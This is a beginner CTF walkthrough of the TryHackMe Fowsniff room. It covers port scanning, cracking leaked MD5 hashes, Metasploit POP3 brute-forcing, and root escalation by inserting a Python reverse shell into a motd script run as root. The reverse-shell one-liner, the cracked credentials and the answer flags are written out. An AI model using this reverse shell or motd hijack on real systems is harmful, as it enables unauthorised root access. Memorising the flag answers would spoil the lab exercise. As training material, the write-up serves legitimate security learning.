---
tags:
  - THM
link: https://tryhackme.com/room/ctf
description: Hack this machine and get the flag. There are lots of hints along the way and is perfect for beginners!
image: https://tryhackme-images.s3.amazonaws.com/room-icons/97b218eed9688e9a5cbe136714b86288.jpeg
---
## Summary

| SECTION/TASK                                 | FLAG                                                                                                                                                                                                                                                                                                      |
| -------------------------------------------- | --------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| Task 1. Hack into the FowSniff organisation. | No answer needed<br>No answer needed<br>No answer needed<br>No answer needed<br>No answer needed<br>No answer needed<br>scoobydoo2<br>No answer needed<br>S1ck3nBluff+secureshell<br>No answer needed<br>No answer needed<br>No answer needed<br>No answer needed<br>No answer needed<br>No answer needed |

<div align="center">
<br>
<br>
※※※※※※※※※※※※※※※※※※※※※※※※
<br>
</div>
<!-- PAGE BREAK -->
<div style="page-break-after: always;"></div>

## Task 1. Hack into the FowSniff organisation.

This boot2root machine is brilliant for new starters. You will have to enumerate this machine by finding open ports, do some online research (its amazing how much information Google can find for you), decoding hashes, brute forcing a pop3 login and much more!

This will be structured to go through what you need to do, step by step. Make sure you are [connected to our network](http://tryhackme.com/access)

Credit to [berzerk0](https://twitter.com/berzerk0) for creating this machine. This machine is used here with the explicit permission of the creator <3
<div>
<br>
<br>
</div>

### Questions

##### Deploy the machine. On the top right of this you will see a **Deploy** button. Click on this to deploy the machine into the cloud. Wait a minute for it to become live.
==No answer needed==
<div>
<br>
<br>
</div>

##### Using nmap, scan this machine. What ports are open?
==No answer needed==

```
┌──(root㉿kali)-[/home/kali/ET/THM/Fowsniff CTF]
└─# nmap 10.82.154.253  
Starting Nmap 7.95 ( https://nmap.org ) at 2025-11-26 09:30 EST
Nmap scan report for 10.82.154.253
Host is up (0.15s latency).
Not shown: 996 closed tcp ports (reset)
PORT    STATE SERVICE
22/tcp  open  ssh
80/tcp  open  http
110/tcp open  pop3
143/tcp open  imap

Nmap done: 1 IP address (1 host up) scanned in 32.15 seconds
```
<div>
<br>
<br>
</div>

##### Using the information from the open ports. Look around. What can you find?
==No answer needed==

We have a web server running on port 80, let's have a look at that in our browser:

![[Pasted image 20251126173228.png]]
<div>
<br>
<br>
</div>

##### Using Google, can you find any public information about them?
==No answer needed==

Check the Question Hint: 

There is a pastebin with all of the company employees emails and hashes. If the pastebin is down, check out TheWayBackMachine, or https://github.com/berzerk0/Fowsniff

![[Pasted image 20251126173556.png]]
<div>
<br>
<br>
</div>

##### Can you decode these md5 hashes? You can even use sites like [hashkiller](https://hashkiller.io/listmanager) to decode them.
==No answer needed==

The passwords you find on https://github.com/berzerk0/Fowsniff/blob/main/fowsniff.txt are MD5 hashes. These can be easily decoded using a site like [Hashes.com](https://hashes.com/en/decrypt/hash?ref=blog.razrsec.uk) - just copy and paste the hashes, complete the captcha and hit submit.

![[Pasted image 20251126155022.png]]

We've managed to decode 8 out of 9 hashed passwords:
```
0e9588cb62f4b6f27e33d449e2ba0b3b:carp4ever
19f5af754c31f1e2651edde9250d69bb:skyler22
1dc352435fecca338acfd4be10984009:apples01
4d6e42f56e127803285a0a7649b5ab11:orlando12
8a28a94a588a95b80163709ab4313aa4:mailcall
90dc16d47114aa13671c697fd506cf26:scoobydoo2
ae1644dac5b77c0cf51e0d26ad6d7e56:bilbo101
f7fd98d380735e859f8b2ffbbede5a7e:07011972
```
<div>
<br>
<br>
</div>

##### Using the usernames and passwords you captured, can you use metasploit to brute force the pop3 login?
==No answer needed==

Before running metasploit, we will create two custom lists - one for usernames and one for passwords.

```
┌──(root㉿kali)-[/home/kali/ET/THM/Fowsniff CTF]
└─# cat fowsniffusers
mauer@fowsniff
mustikka@fowsniff
tegel@fowsniff
baksteen@fowsniff
seina@fowsniff
mursten@fowsniff
parede@fowsniff
sciana@fowsniff


┌──(root㉿kali)-[/home/kali/ET/THM/Fowsniff CTF]
└─# cat fowsniffpass 
carp4ever
skyler22
apples01
orlando12
mailcall
scoobydoo2
bilbo101
07011972
```

Using the `_/auxiliary/scanner/pop3/pop3_login_ module` in Metasploit, we can attempt to brute force the POP3 service using our custom lists we just created.
Set the required parameters then run your exploit.

```
┌──(root㉿kali)-[/home/kali/ET/THM/Fowsniff CTF]
└─# msfconsole
Metasploit tip: Network adapter names can be used for IP options set LHOST 
eth0
                                                  

         .                                         .
 .

      dBBBBBBb  dBBBP dBBBBBBP dBBBBBb  .                       o
       '   dB'                     BBP
    dB'dB'dB' dBBP     dBP     dBP BB
   dB'dB'dB' dBP      dBP     dBP  BB
  dB'dB'dB' dBBBBP   dBP     dBBBBBBB

                                   dBBBBBP  dBBBBBb  dBP    dBBBBP dBP dBBBBBBP
          .                  .                  dB' dBP    dB'.BP
                             |       dBP    dBBBB' dBP    dB'.BP dBP    dBP
                           --o--    dBP    dBP    dBP    dB'.BP dBP    dBP
                             |     dBBBBP dBP    dBBBBP dBBBBP dBP    dBP

                                                                    .
                .
        o                  To boldly go where no
                            shell has gone before


       =[ metasploit v6.4.84-dev                                ]
+ -- --=[ 2,547 exploits - 1,309 auxiliary - 1,683 payloads     ]
+ -- --=[ 432 post - 49 encoders - 13 nops - 9 evasion          ]

Metasploit Documentation: https://docs.metasploit.com/
The Metasploit Framework is a Rapid7 Open Source Project

msf > search pop3 login

Matching Modules
================

   #  Name                               Disclosure Date  Rank    Check  Description
   -  ----                               ---------------  ----    -----  -----------
   0  auxiliary/scanner/pop3/pop3_login  .                normal  No     POP3 Login Utility


Interact with a module by name or index. For example info 0, use 0 or use auxiliary/scanner/pop3/pop3_login

msf > use 0
msf auxiliary(scanner/pop3/pop3_login) > options

Module options (auxiliary/scanner/pop3/pop3_login):

   Name              Current Setting                Required  Description
   ----              ---------------                --------  -----------
   ANONYMOUS_LOGIN   false                          yes       Attempt to login with a blank username and password
   BLANK_PASSWORDS   false                          no        Try blank passwords for all users
   BRUTEFORCE_SPEED  5                              yes       How fast to bruteforce, from 0 to 5
   DB_ALL_CREDS      false                          no        Try each user/password couple stored in the current
                                                              database
   DB_ALL_PASS       false                          no        Add all passwords in the current database to the lis
                                                              t
   DB_ALL_USERS      false                          no        Add all users in the current database to the list
   DB_SKIP_EXISTING  none                           no        Skip existing credentials stored in the current data
                                                              base (Accepted: none, user, user&realm)
   PASSWORD                                         no        A specific password to authenticate with
   PASS_FILE         /usr/share/metasploit-framewo  no        The file that contains a list of probable passwords.
                     rk/data/wordlists/unix_passwo
                     rds.txt
   RHOSTS                                           yes       The target host(s), see https://docs.metasploit.com/
                                                              docs/using-metasploit/basics/using-metasploit.html
   RPORT             110                            yes       The target port (TCP)
   STOP_ON_SUCCESS   false                          yes       Stop guessing when a credential works for a host
   THREADS           1                              yes       The number of concurrent threads (max one per host)
   USERNAME                                         no        A specific username to authenticate as
   USERPASS_FILE                                    no        File containing users and passwords separated by spa
                                                              ce, one pair per line
   USER_AS_PASS      false                          no        Try the username as the password for all users
   USER_FILE         /usr/share/metasploit-framewo  no        The file that contains a list of probable users acco
                     rk/data/wordlists/unix_users.            unts.
                     txt
   VERBOSE           true                           yes       Whether to print output for all attempts


View the full module info with the info, or info -d command.

msf auxiliary(scanner/pop3/pop3_login) > set RHOSTS 10.82.154.253
RHOSTS => 10.82.154.253
msf auxiliary(scanner/pop3/pop3_login) > set USERPASS_FILE fowsniffusers
USERPASS_FILE => fowsniffusers
msf auxiliary(scanner/pop3/pop3_login) > set PASS_FILE fowsniffpass
PASS_FILE => fowsniffpass
msf auxiliary(scanner/pop3/pop3_login) > set VERBOSE false
VERBOSE => false
msf auxiliary(scanner/pop3/pop3_login) > set STOP_ON_SUCCESS true
STOP_ON_SUCCESS => true
msf auxiliary(scanner/pop3/pop3_login) > exploit

```

Great, we got a hit! 
<div>
<br>
<br>
</div>

##### What was seina's password to the email service?
==scoobydoo2==
<div>
<br>
<br>
</div>

##### Can you connect to the pop3 service with her credentials? What email information can you gather?
==No answer needed==

We can now try connecting to the POP3 service using these credentials:

```
USER seina
PASS scoobydoo2
```

```
┌──(root㉿kali)-[/home/kali/ET/THM/Fowsniff CTF]
└─# nc 10.82.154.253 110
+OK Welcome to the Fowsniff Corporate Mail Server!
USER seina
+OK
PASS scoobydoo2
+OK Logged in.
```

Once logged in, the LIST command can be used to see a summary of messages and the RETR command to retrieve them:

```
LIST
+OK 2 messages:
1 1622
2 1280
.
RETR 1
+OK 1622 octets
Return-Path: <stone@fowsniff>
X-Original-To: seina@fowsniff
Delivered-To: seina@fowsniff
Received: by fowsniff (Postfix, from userid 1000)
        id 0FA3916A; Tue, 13 Mar 2018 14:51:07 -0400 (EDT)
To: baksteen@fowsniff, mauer@fowsniff, mursten@fowsniff,
    mustikka@fowsniff, parede@fowsniff, sciana@fowsniff, seina@fowsniff,
    tegel@fowsniff
Subject: URGENT! Security EVENT!
Message-Id: <20180313185107.0FA3916A@fowsniff>
Date: Tue, 13 Mar 2018 14:51:07 -0400 (EDT)
From: stone@fowsniff (stone)

Dear All,

A few days ago, a malicious actor was able to gain entry to
our internal email systems. The attacker was able to exploit
incorrectly filtered escape characters within our SQL database
to access our login credentials. Both the SQL and authentication
system used legacy methods that had not been updated in some time.

We have been instructed to perform a complete internal system
overhaul. While the main systems are "in the shop," we have
moved to this isolated, temporary server that has minimal
functionality.

This server is capable of sending and receiving emails, but only
locally. That means you can only send emails to other users, not
to the world wide web. You can, however, access this system via 
the SSH protocol.

The temporary password for SSH is "S1ck3nBluff+secureshell"

You MUST change this password as soon as possible, and you will do so under my
guidance. I saw the leak the attacker posted online, and I must say that your
passwords were not very secure.

Come see me in my office at your earliest convenience and we'll set it up.

Thanks,
A.J Stone


.
```

The first email contains a temporary password for the SSH service.

```
The temporary password for SSH is "S1ck3nBluff+secureshell"
```
<div>
<br>
<br>
</div>

##### Looking through her emails, what was a temporary password set for her?
==S1ck3nBluff+secureshell==
The first email contains a temporary password for the SSH service.

```
The temporary password for SSH is "S1ck3nBluff+secureshell"
```
<div>
<br>
<br>
</div>

##### In the email, who sent it? Using the password from the previous question and the senders username, connect to the machine using SSH.
==No answer needed==

```
┌──(root㉿kali)-[/home/kali/ET/THM/Fowsniff CTF]
└─# ssh baksteen@10.82.154.253
The authenticity of host '10.82.154.253 (10.82.154.253)' can't be established.
ED25519 key fingerprint is SHA256:KZLP3ydGPtqtxnZ11SUpIwqMdeOUzGWHV+c3FqcKYg0.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.82.154.253' (ED25519) to the list of known hosts.
baksteen@10.82.154.253's password: 

                            _____                       _  __  __  
      :sdddddddddddddddy+  |  ___|____      _____ _ __ (_)/ _|/ _|  
   :yNMMMMMMMMMMMMMNmhsso  | |_ / _ \ \ /\ / / __| '_ \| | |_| |_   
.sdmmmmmNmmmmmmmNdyssssso  |  _| (_) \ V  V /\__ \ | | | |  _|  _|  
-:      y.      dssssssso  |_|  \___/ \_/\_/ |___/_| |_|_|_| |_|   
-:      y.      dssssssso                ____                      
-:      y.      dssssssso               / ___|___  _ __ _ __        
-:      y.      dssssssso              | |   / _ \| '__| '_ \     
-:      o.      dssssssso              | |__| (_) | |  | |_) |  _  
-:      o.      yssssssso               \____\___/|_|  | .__/  (_) 
-:    .+mdddddddmyyyyyhy:                              |_|        
-: -odMMMMMMMMMMmhhdy/.    
.ohdddddddddddddho:                  Delivering Solutions


   ****  Welcome to the Fowsniff Corporate Server! **** 

              ---------- NOTICE: ----------

 * Due to the recent security breach, we are running on a very minimal system.
 * Contact AJ Stone -IMMEDIATELY- about changing your email and SSH passwords.


Last login: Tue Mar 13 16:55:40 2018 from 192.168.7.36
baksteen@fowsniff:~$ 

```
<div>
<br>
<br>
</div>

##### Once connected, what groups does this user belong to? Are there any interesting files that can be run by that group?
==No answer needed==

From our low-privileged user shell we can enumerate the system further. Our user does not have any _sudo_ privileges and we cannot access any of the other users home directories.

Running the _groups_ command we find this user belongs to a group called "users", which has the permissions to run a file named "_cube.sh_":

```
baksteen@fowsniff:~$ groups
users baksteen
```

Next we search the entire system for regular files owned by the group `users`.

```
baksteen@fowsniff:~$ find / -group users -type f 2>/dev/null
/opt/cube/cube.sh
/home/baksteen/.cache/motd.legal-displayed
/home/baksteen/Maildir/dovecot-uidvalidity
/home/baksteen/Maildir/dovecot.index.log
/home/baksteen/Maildir/new/1520967067.V801I23764M196461.fowsniff
/home/baksteen/Maildir/dovecot-uidlist
/home/baksteen/Maildir/dovecot-uidvalidity.5aa21fac
/home/baksteen/.viminfo
/home/baksteen/.bash_history
/home/baksteen/.lesshsQ
/home/baksteen/.bash_logout
/home/baksteen/term.txt
/home/baksteen/.profile
/home/baksteen/.bashrc
/sys/fs/cgroup/systemd/user.slice/user-1004.slice/user@1004.service/tasks
/sys/fs/cgroup/systemd/user.slice/user-1004.slice/user@1004.service/cgroup.procs
/sys/fs/cgroup/systemd/user.slice/user-1004.slice/user@1004.service/init.scope/tasks
/sys/fs/cgroup/systemd/user.slice/user-1004.slice/user@1004.service/init.scope/cgroup.procs
/sys/fs/cgroup/systemd/user.slice/user-1004.slice/user@1004.service/init.scope/cgroup.clone_children
/sys/fs/cgroup/systemd/user.slice/user-1004.slice/user@1004.service/init.scope/notify_on_release
/proc/10612/task/10612/fdinfo/0
/proc/10612/task/10612/fdinfo/1
/proc/10612/task/10612/fdinfo/2
/proc/10612/task/10612/fdinfo/3
/proc/10612/task/10612/fdinfo/4
/proc/10612/task/10612/fdinfo/5
/proc/10612/task/10612/fdinfo/6
/proc/10612/task/10612/fdinfo/7
/proc/10612/task/10612/fdinfo/8
/proc/10612/task/10612/fdinfo/9
/proc/10612/task/10612/fdinfo/10
/proc/10612/task/10612/fdinfo/11
/proc/10612/task/10612/fdinfo/12
/proc/10612/task/10612/fdinfo/13
/proc/10612/task/10612/fdinfo/14
/proc/10612/task/10612/environ
/proc/10612/task/10612/auxv
/proc/10612/task/10612/status
/proc/10612/task/10612/personality
/proc/10612/task/10612/limits
/proc/10612/task/10612/sched
/proc/10612/task/10612/comm
/proc/10612/task/10612/syscall
/proc/10612/task/10612/cmdline
/proc/10612/task/10612/stat
/proc/10612/task/10612/statm
/proc/10612/task/10612/maps
/proc/10612/task/10612/children
/proc/10612/task/10612/numa_maps
/proc/10612/task/10612/mem
/proc/10612/task/10612/mounts
/proc/10612/task/10612/mountinfo
/proc/10612/task/10612/clear_refs
/proc/10612/task/10612/smaps
/proc/10612/task/10612/pagemap
/proc/10612/task/10612/attr/current
/proc/10612/task/10612/attr/prev
/proc/10612/task/10612/attr/exec
/proc/10612/task/10612/attr/fscreate
/proc/10612/task/10612/attr/keycreate
/proc/10612/task/10612/attr/sockcreate
/proc/10612/task/10612/wchan
/proc/10612/task/10612/stack
/proc/10612/task/10612/schedstat
/proc/10612/task/10612/cpuset
/proc/10612/task/10612/cgroup
/proc/10612/task/10612/oom_score
/proc/10612/task/10612/oom_adj
/proc/10612/task/10612/oom_score_adj
/proc/10612/task/10612/loginuid
/proc/10612/task/10612/sessionid
/proc/10612/task/10612/io
/proc/10612/task/10612/uid_map
/proc/10612/task/10612/gid_map
/proc/10612/task/10612/projid_map
/proc/10612/task/10612/setgroups
/proc/10612/fdinfo/0
/proc/10612/fdinfo/1
/proc/10612/fdinfo/2
/proc/10612/fdinfo/3
/proc/10612/fdinfo/4
/proc/10612/fdinfo/5
/proc/10612/fdinfo/6
/proc/10612/fdinfo/7
/proc/10612/fdinfo/8
/proc/10612/fdinfo/9
/proc/10612/fdinfo/10
/proc/10612/fdinfo/11
/proc/10612/fdinfo/12
/proc/10612/fdinfo/13
/proc/10612/fdinfo/14
/proc/10612/environ
/proc/10612/auxv
/proc/10612/status
/proc/10612/personality
/proc/10612/limits
/proc/10612/sched
/proc/10612/autogroup
/proc/10612/comm
/proc/10612/syscall
/proc/10612/cmdline
/proc/10612/stat
/proc/10612/statm
/proc/10612/maps
/proc/10612/numa_maps
/proc/10612/mem
/proc/10612/mounts
/proc/10612/mountinfo
/proc/10612/mountstats
/proc/10612/clear_refs
/proc/10612/smaps
/proc/10612/pagemap
/proc/10612/attr/current
/proc/10612/attr/prev
/proc/10612/attr/exec
/proc/10612/attr/fscreate
/proc/10612/attr/keycreate
/proc/10612/attr/sockcreate
/proc/10612/wchan
/proc/10612/stack
/proc/10612/schedstat
/proc/10612/cpuset
/proc/10612/cgroup
/proc/10612/oom_score
/proc/10612/oom_adj
/proc/10612/oom_score_adj
/proc/10612/loginuid
/proc/10612/sessionid
/proc/10612/coredump_filter
/proc/10612/io
/proc/10612/uid_map
/proc/10612/gid_map
/proc/10612/projid_map
/proc/10612/setgroups
/proc/10612/timers
/proc/10638/task/10638/fdinfo/0
/proc/10638/task/10638/fdinfo/1
/proc/10638/task/10638/fdinfo/2
/proc/10638/task/10638/fdinfo/255
/proc/10638/task/10638/environ
/proc/10638/task/10638/auxv
/proc/10638/task/10638/status
/proc/10638/task/10638/personality
/proc/10638/task/10638/limits
/proc/10638/task/10638/sched
/proc/10638/task/10638/comm
/proc/10638/task/10638/syscall
/proc/10638/task/10638/cmdline
/proc/10638/task/10638/stat
/proc/10638/task/10638/statm
/proc/10638/task/10638/maps
/proc/10638/task/10638/children
/proc/10638/task/10638/numa_maps
/proc/10638/task/10638/mem
/proc/10638/task/10638/mounts
/proc/10638/task/10638/mountinfo
/proc/10638/task/10638/clear_refs
/proc/10638/task/10638/smaps
/proc/10638/task/10638/pagemap
/proc/10638/task/10638/attr/current
/proc/10638/task/10638/attr/prev
/proc/10638/task/10638/attr/exec
/proc/10638/task/10638/attr/fscreate
/proc/10638/task/10638/attr/keycreate
/proc/10638/task/10638/attr/sockcreate
/proc/10638/task/10638/wchan
/proc/10638/task/10638/stack
/proc/10638/task/10638/schedstat
/proc/10638/task/10638/cpuset
/proc/10638/task/10638/cgroup
/proc/10638/task/10638/oom_score
/proc/10638/task/10638/oom_adj
/proc/10638/task/10638/oom_score_adj
/proc/10638/task/10638/loginuid
/proc/10638/task/10638/sessionid
/proc/10638/task/10638/io
/proc/10638/task/10638/uid_map
/proc/10638/task/10638/gid_map
/proc/10638/task/10638/projid_map
/proc/10638/task/10638/setgroups
/proc/10638/fdinfo/0
/proc/10638/fdinfo/1
/proc/10638/fdinfo/2
/proc/10638/fdinfo/255
/proc/10638/environ
/proc/10638/auxv
/proc/10638/status
/proc/10638/personality
/proc/10638/limits
/proc/10638/sched
/proc/10638/autogroup
/proc/10638/comm
/proc/10638/syscall
/proc/10638/cmdline
/proc/10638/stat
/proc/10638/statm
/proc/10638/maps
/proc/10638/numa_maps
/proc/10638/mem
/proc/10638/mounts
/proc/10638/mountinfo
/proc/10638/mountstats
/proc/10638/clear_refs
/proc/10638/smaps
/proc/10638/pagemap
/proc/10638/attr/current
/proc/10638/attr/prev
/proc/10638/attr/exec
/proc/10638/attr/fscreate
/proc/10638/attr/keycreate
/proc/10638/attr/sockcreate
/proc/10638/wchan
/proc/10638/stack
/proc/10638/schedstat
/proc/10638/cpuset
/proc/10638/cgroup
/proc/10638/oom_score
/proc/10638/oom_adj
/proc/10638/oom_score_adj
/proc/10638/loginuid
/proc/10638/sessionid
/proc/10638/coredump_filter
/proc/10638/io
/proc/10638/uid_map
/proc/10638/gid_map
/proc/10638/projid_map
/proc/10638/setgroups
/proc/10638/timers
/proc/10685/task/10685/fdinfo/0
/proc/10685/task/10685/fdinfo/1
/proc/10685/task/10685/fdinfo/2
/proc/10685/task/10685/fdinfo/3
/proc/10685/task/10685/fdinfo/4
/proc/10685/task/10685/fdinfo/5
/proc/10685/task/10685/fdinfo/7
/proc/10685/task/10685/fdinfo/8
/proc/10685/task/10685/fdinfo/9
/proc/10685/task/10685/fdinfo/10
/proc/10685/task/10685/environ
/proc/10685/task/10685/auxv
/proc/10685/task/10685/status
/proc/10685/task/10685/personality
/proc/10685/task/10685/limits
/proc/10685/task/10685/sched
/proc/10685/task/10685/comm
/proc/10685/task/10685/syscall
/proc/10685/task/10685/cmdline
/proc/10685/task/10685/stat
/proc/10685/task/10685/statm
/proc/10685/task/10685/maps
/proc/10685/task/10685/children
/proc/10685/task/10685/numa_maps
/proc/10685/task/10685/mem
/proc/10685/task/10685/mounts
/proc/10685/task/10685/mountinfo
/proc/10685/task/10685/clear_refs
/proc/10685/task/10685/smaps
/proc/10685/task/10685/pagemap
/proc/10685/task/10685/attr/current
/proc/10685/task/10685/attr/prev
/proc/10685/task/10685/attr/exec
/proc/10685/task/10685/attr/fscreate
/proc/10685/task/10685/attr/keycreate
/proc/10685/task/10685/attr/sockcreate
/proc/10685/task/10685/wchan
/proc/10685/task/10685/stack
/proc/10685/task/10685/schedstat
/proc/10685/task/10685/cpuset
/proc/10685/task/10685/cgroup
/proc/10685/task/10685/oom_score
/proc/10685/task/10685/oom_adj
/proc/10685/task/10685/oom_score_adj
/proc/10685/task/10685/loginuid
/proc/10685/task/10685/sessionid
/proc/10685/task/10685/io
/proc/10685/task/10685/uid_map
/proc/10685/task/10685/gid_map
/proc/10685/task/10685/projid_map
/proc/10685/task/10685/setgroups
/proc/10685/fdinfo/0
/proc/10685/fdinfo/1
/proc/10685/fdinfo/2
/proc/10685/fdinfo/3
/proc/10685/fdinfo/4
/proc/10685/fdinfo/6
/proc/10685/fdinfo/7
/proc/10685/environ
/proc/10685/auxv
/proc/10685/status
/proc/10685/personality
/proc/10685/limits
/proc/10685/sched
/proc/10685/autogroup
/proc/10685/comm
/proc/10685/syscall
/proc/10685/cmdline
/proc/10685/stat
/proc/10685/statm
/proc/10685/maps
/proc/10685/numa_maps
/proc/10685/mem
/proc/10685/mounts
/proc/10685/mountinfo
/proc/10685/mountstats
/proc/10685/clear_refs
/proc/10685/smaps
/proc/10685/pagemap
/proc/10685/attr/current
/proc/10685/attr/prev
/proc/10685/attr/exec
/proc/10685/attr/fscreate
/proc/10685/attr/keycreate
/proc/10685/attr/sockcreate
/proc/10685/wchan
/proc/10685/stack
/proc/10685/schedstat
/proc/10685/cpuset
/proc/10685/cgroup
/proc/10685/oom_score
/proc/10685/oom_adj
/proc/10685/oom_score_adj
/proc/10685/loginuid
/proc/10685/sessionid
/proc/10685/coredump_filter
/proc/10685/io
/proc/10685/uid_map
/proc/10685/gid_map
/proc/10685/projid_map
/proc/10685/setgroups
/proc/10685/timers
```

Running this script we find this looks exactly like the banner that is displayed when logging in via SSH.

```
baksteen@fowsniff:~$ /opt/cube/cube.sh

                            _____                       _  __  __  
      :sdddddddddddddddy+  |  ___|____      _____ _ __ (_)/ _|/ _|  
   :yNMMMMMMMMMMMMMNmhsso  | |_ / _ \ \ /\ / / __| '_ \| | |_| |_   
.sdmmmmmNmmmmmmmNdyssssso  |  _| (_) \ V  V /\__ \ | | | |  _|  _|  
-:      y.      dssssssso  |_|  \___/ \_/\_/ |___/_| |_|_|_| |_|   
-:      y.      dssssssso                ____                      
-:      y.      dssssssso               / ___|___  _ __ _ __        
-:      y.      dssssssso              | |   / _ \| '__| '_ \     
-:      o.      dssssssso              | |__| (_) | |  | |_) |  _  
-:      o.      yssssssso               \____\___/|_|  | .__/  (_) 
-:    .+mdddddddmyyyyyhy:                              |_|        
-: -odMMMMMMMMMMmhhdy/.    
.ohdddddddddddddho:                  Delivering Solutions

```
<div>
<br>
<br>
</div>

##### Now you have found a file that can be edited by the group, can you edit it to include a reverse shell?

Python Reverse Shell:

```
python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((<IP>,1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
```

Other reverse shells: [here](http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet).
==No answer needed==
<div>
<br>
<br>
</div>

##### If you have not found out already, this file is run as root when a user connects to the machine using SSH. We know this as when we first connect we can see we get given a banner (with fowsniff corp). Look in **/etc/update-motd.d/** file. If (after we have put our reverse shell in the cube file) we then include this file in the motd.d file, it will run as root and we will get a reverse shell as root!
==No answer needed==

Taking a look in the `/etc/update-motd.d` folder and the `00-header`file shows that the`/opt/cube/cube.sh` file is run when a user connects to the machine using SSH (and that it will run as the root user)

```
baksteen@fowsniff:~$ cd /etc/update-motd.d/
baksteen@fowsniff:/etc/update-motd.d$ ls
00-header  10-help-text  91-release-upgrade  99-esm
baksteen@fowsniff:/etc/update-motd.d$ cat 00-header 
#!/bin/sh
#
#    00-header - create the header of the MOTD
#    Copyright (C) 2009-2010 Canonical Ltd.
#
#    Authors: Dustin Kirkland <kirkland@canonical.com>
#
#    This program is free software; you can redistribute it and/or modify
#    it under the terms of the GNU General Public License as published by
#    the Free Software Foundation; either version 2 of the License, or
#    (at your option) any later version.
#
#    This program is distributed in the hope that it will be useful,
#    but WITHOUT ANY WARRANTY; without even the implied warranty of
#    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
#    GNU General Public License for more details.
#
#    You should have received a copy of the GNU General Public License along
#    with this program; if not, write to the Free Software Foundation, Inc.,
#    51 Franklin Street, Fifth Floor, Boston, MA 02110-1301 USA.

#[ -r /etc/lsb-release ] && . /etc/lsb-release

#if [ -z "$DISTRIB_DESCRIPTION" ] && [ -x /usr/bin/lsb_release ]; then
#       # Fall back to using the very slow lsb_release utility
#       DISTRIB_DESCRIPTION=$(lsb_release -s -d)
#fi

#printf "Welcome to %s (%s %s %s)\n" "$DISTRIB_DESCRIPTION" "$(uname -o)" "$(uname -r)" "$(uname -m)"

sh /opt/cube/cube.sh
```

This file calls motd (message of the day); banners, and announcements that you get upon login with information about the system or server. Usually a splash screen and announcement. 

We can edit the `cube.sh` file to include a python reverse shell that will trigger once our user logs in via SSH - (make sure you add your local IP and listener port)

```
baksteen@fowsniff:~$ cd /opt/cube/
baksteen@fowsniff:/opt/cube$ ls
cube.sh
baksteen@fowsniff:/opt/cube$ vi cube.sh 
baksteen@fowsniff:/opt/cube$ vi cube.sh 
baksteen@fowsniff:/opt/cube$ cat cube.sh 
printf "
                            _____                       _  __  __  
      :sdddddddddddddddy+  |  ___|____      _____ _ __ (_)/ _|/ _|  
   :yNMMMMMMMMMMMMMNmhsso  | |_ / _ \ \ /\ / / __| '_ \| | |_| |_   
.sdmmmmmNmmmmmmmNdyssssso  |  _| (_) \ V  V /\__ \ | | | |  _|  _|  
-:      y.      dssssssso  |_|  \___/ \_/\_/ |___/_| |_|_|_| |_|   
-:      y.      dssssssso                ____                      
-:      y.      dssssssso               / ___|___  _ __ _ __        
-:      y.      dssssssso              | |   / _ \| '__| '_ \     
-:      o.      dssssssso              | |__| (_) | |  | |_) |  _  
-:      o.      yssssssso               \____\___/|_|  | .__/  (_) 
-:    .+mdddddddmyyyyyhy:                              |_|        
-: -odMMMMMMMMMMmhhdy/.    
.ohdddddddddddddho:                  Delivering Solutions\n\n"

python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.134.50",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
```
<div>
<br>
<br>
</div>

##### Start a netcat listener (nc -lvp 1234) and then re-login to the SSH service. You will then receive a reverse shell on your netcat session as root!
==No answer needed==

We can then exit our SSH session and set up a listener on our local machine:
```
┌──(kali㉿kali)-[~/ET/THM/Fowsniff CTF]
└─$ nc -nvlp 1234
```

When we open a separate terminal and log in via SSH we should now get a reverse shell as the _root_ user within our listener - from here we can simply change to the _root_ directory and grab the flag.

```
┌──(root㉿kali)-[/home/kali/ET/THM/Fowsniff CTF]
└─# ssh baksteen@10.82.154.253
baksteen@10.82.154.253's password: 
```

```
┌──(kali㉿kali)-[~/ET/THM/Fowsniff CTF]
└─$ nc -nvlp 1234
listening on [any] 1234 ...
connect to [192.168.134.50] from (UNKNOWN) [10.82.154.253] 50018
/bin/sh: 0: can't access tty; job control turned off
# whoami
root
```

```
┌──(kali㉿kali)-[~/ET/THM/Fowsniff CTF]
└─$ nc -nvlp 1234
listening on [any] 1234 ...
connect to [192.168.134.50] from (UNKNOWN) [10.82.154.253] 50022
/bin/sh: 0: can't access tty; job control turned off
# ls
bin
boot
dev
etc
home
initrd.img
lib
lib64
lost+found
media
mnt
opt
proc
root
run
sbin
srv
sys
tmp
usr
var
vmlinuz
# cd root
# ls
Maildir
flag.txt
# cat flag.txt  
   ___                        _        _      _   _             _ 
  / __|___ _ _  __ _ _ _ __ _| |_ _  _| |__ _| |_(_)___ _ _  __| |
 | (__/ _ \ ' \/ _` | '_/ _` |  _| || | / _` |  _| / _ \ ' \(_-<_|
  \___\___/_||_\__, |_| \__,_|\__|\_,_|_\__,_|\__|_\___/_||_/__(_)
               |___/ 

 (_)
  |--------------
  |&&&&&&&&&&&&&&|
  |    R O O T   |
  |    F L A G   |
  |&&&&&&&&&&&&&&|
  |--------------
  |
  |
  |
  |
  |
  |
 ---

Nice work!

This CTF was built with love in every byte by @berzerk0 on Twitter.

Special thanks to psf, @nbulischeck and the whole Fofao Team.

# 
```
<div>
<br>
<br>
</div>

##### If you are **really really** stuck, there is a brilliant walkthrough here: [https://www.hackingarticles.in/fowsniff-1-vulnhub-walkthrough/](https://www.hackingarticles.in/fowsniff-1-vulnhub-walkthrough/) **[](https://www.hackingarticles.in/fowsniff-1-vulnhub-walkthrough/)**<br><br>If its easier, follow this walkthrough with the deployed machine on the site.
==No answer needed==
<div>
<br>
<br>
</div>

<div align="center">
<br>
<br>
※※※※※※※※※※※※※※※※※※※※※※※※
<br>
</div>
<!-- PAGE BREAK -->
<div style="page-break-after: always;"></div>

## References

